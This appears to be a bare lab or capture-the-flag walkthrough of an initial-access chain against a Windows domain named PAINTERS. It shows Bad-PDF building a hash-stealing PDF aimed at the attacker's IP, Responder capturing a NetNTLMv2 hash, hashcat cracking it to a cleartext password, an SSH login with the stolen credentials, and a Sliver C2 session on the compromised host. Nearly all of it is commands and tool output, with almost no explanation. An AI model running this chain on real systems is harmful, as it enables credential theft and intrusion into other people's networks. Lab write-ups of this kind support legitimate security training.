
\



https://www.ired.team/offensive-security/initial-access/netntlmv2-hash-stealing-using-outlook#references

for initial access?


```
kali@kali ~/Bad-Pdf (master)> sudo python2 badpdf.py


        ______                 __       _______  ______   ________
        |_   _ \               |  ]     |_   __ \|_   _ `.|_   __  |
          | |_) |  ,--.    .--.| | ______ | |__) | | | `. \ | |_ \_|
          |  __'. `'_\ : / /'`' ||______||  ___/  | |  | | |  _|
         _| |__) |// | |,| \__/  |       _| |_    _| |_.' /_| |_
        |_______/ '-;__/ '.__.;__]     |_____|  |______.'|_____|

        Author : Deepu TV ; Alias DeepZec

        =============================================================

Responder detected :/usr/sbin/responder
Please enter Bad-PDF host IP:
10.10.17.202
Please enter output file name:
file.pdf
Please enter the interface name to listen(Default eth0):
tun0
[*] Starting Process.. [*]
Bad PDF file.pdf created
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [ON]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.17.202]
    Responder IPv6             [dead:beef:4::11c8]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-OKR8PTBVWQG]
    Responder Domain Name      [H2W3.LOCAL]
    Responder DCE-RPC Port     [46308]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.35
[SMB] NTLMv2-SSP Username : PAINTERS\riley
[SMB] NTLMv2-SSP Hash     : riley::PAINTERS:537d2ec7be78daef:F99D615A32CFC40C7D09E61DA3BBB70A:01010000000000008067890D2FD0DA018AB7DBD7743FDEBD0000000002000800480032005700330001001E00570049004E002D004F004B0052003800500054004200560057005100470004003400570049004E002D004F004B005200380050005400420056005700510047002E0048003200570033002E004C004F00430041004C000300140048003200570033002E004C004F00430041004C000500140048003200570033002E004C004F00430041004C00070008008067890D2FD0DA010600040002000000080030003000000000000000000000000020000005AD217ECD19F90B3256728CD2F0D7BFEEC8D4ABF1152C8D72A931A19F425F0D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310037002E003200300032000000000000000000
```



```
riley::PAINTERS:537d2ec7be78daef:F99D615A32CFC40C7D09E61DA3BBB70A:01010000000000008067890D2FD0DA018AB7DBD7743FDEBD0000000002000800480032005700330001001E00570049004E002D004F004B0052003800500054004200560057005100470004003400570049004E002D004F004B005200380050005400420056005700510047002E0048003200570033002E004C004F00430041004C000300140048003200570033002E004C004F00430041004C000500140048003200570033002E004C004F00430041004C00070008008067890D2FD0DA010600040002000000080030003000000000000000000000000020000005AD217ECD19F90B3256728CD2F0D7BFEEC8D4ABF1152C8D72A931A19F425F0D0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310037002E003200300032000000000000000000
```


```
PS D:\hashcat-6.2.6> .\hashcat.exe -m 5600 newest.txt rockyou.txt -O -D 2
hashcat (v6.2.6) starting

hiprtcCompileProgram is missing from HIPRTC shared library.

OpenCL API (OpenCL 2.1 AMD-APP (3444.0)) - Platform #1 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #1: AMD Radeon RX 6600, 8064/8176 MB (6949 MB allocatable), 14MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 27

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1475 MB

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

RILEY::PAINTERS:537d2ec7be78daef:f99d615a32cfc40c7d09e61da3bbb70a:01010000000000008067890d2fd0da018ab7dbd7743fdebd000000000200080048                                                                                                           80032005700330001001e00570049004e002d004f004b0052003800500054004200560057005100470004003400570049004e002d004f004b00520038005000540042                                                                                                           20056005700510047002e0048003200570033002e004c004f00430041004c000300140048003200570033002e004c004f00430041004c000500140048003200570033                                                                                                           3002e004c004f00430041004c00070008008067890d2fd0da010600040002000000080030003000000000000000000000000020000005ad217ecd19f90b3256728cd2                                                                                                           2f0d7bfeec8d4abf1152c8d72a931a19f425f0d0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e0031                                                                                                           10037002e003200300032000000000000000000:P@ssw0rd

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: RILEY::PAINTERS:537d2ec7be78daef:f99d615a32cfc40c7d...000000
Time.Started.....: Sun Jul 07 12:35:28 2024 (1 sec)
Time.Estimated...: Sun Jul 07 12:35:29 2024 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   108.0 MH/s (1.32ms) @ Accel:512 Loops:1 Thr:128 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 917541/14344384 (6.40%)
Rejected.........: 37/917541 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> jallah
Hardware.Mon.#1..: Temp: 49c Fan:  0% Util: 19% Core:1262MHz Mem:1604MHz Bus:8

Started: Sun Jul 07 12:35:15 2024
Stopped: Sun Jul 07 12:35:30 2024
```


`riley:P@ssw0rd`



```
kali@kali ~> ssh riley@10.10.110.35
riley@10.10.110.35's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun  7 Jul 09:37:31 UTC 2024

  System load:  0.0               Processes:             238
  Usage of /:   39.8% of 9.75GB   Users logged in:       2
  Memory usage: 9%                IPv4 address for eth0: 192.168.110.51
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

3 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Jul  7 08:02:55 2024 from 10.10.14.6
riley@mail:~$

```



```
sliver (SMOOTH_USE) > netstat

 Protocol   Local Address          Foreign Address      State         PID/Program Name
========== ====================== ==================== ============= ==================
 tcp        192.168.110.51:46686   192.168.110.53:445   ESTABLISHED   0/
 tcp        192.168.110.51:22      10.10.17.203:52588   ESTABLISHED   0/
 tcp        192.168.110.51:22      10.10.14.6:44084     ESTABLISHED   0/
 tcp        192.168.110.51:46688   192.168.110.53:445   ESTABLISHED   0/
 tcp        192.168.110.51:46660   192.168.110.53:445   ESTABLISHED   0/
 tcp        192.168.110.51:49264   10.10.17.193:53      ESTABLISHED   0/
 tcp        192.168.110.51:22      10.10.14.4:42008     ESTABLISHED   0/
 tcp        192.168.110.51:22      10.10.17.193:55454   ESTABLISHED   0/
 tcp        192.168.110.51:46122   192.168.210.13:443   ESTABLISHED   0/
 tcp        192.168.110.51:60380   10.10.17.203:443     ESTABLISHED   4686/agent
 tcp        192.168.110.51:46676   192.168.110.53:445   ESTABLISHED   0/
 tcp        192.168.110.51:40838   10.10.17.202:443     ESTABLISHED   5453/test.elf
 tcp        192.168.110.51:22      10.10.17.202:32876   ESTABLISHED   0/

```

```
sliver (SMOOTH_USE) > ifconfig

+-------------------------------------------+
| eth0                                      |
+-------------------------------------------+
| # | IP Addresses      | MAC Address       |
+---+-------------------+-------------------+
| 2 | 192.168.110.51/24 | 00:50:56:94:89:08 |
+-------------------------------------------+
1 adapters not shown.

```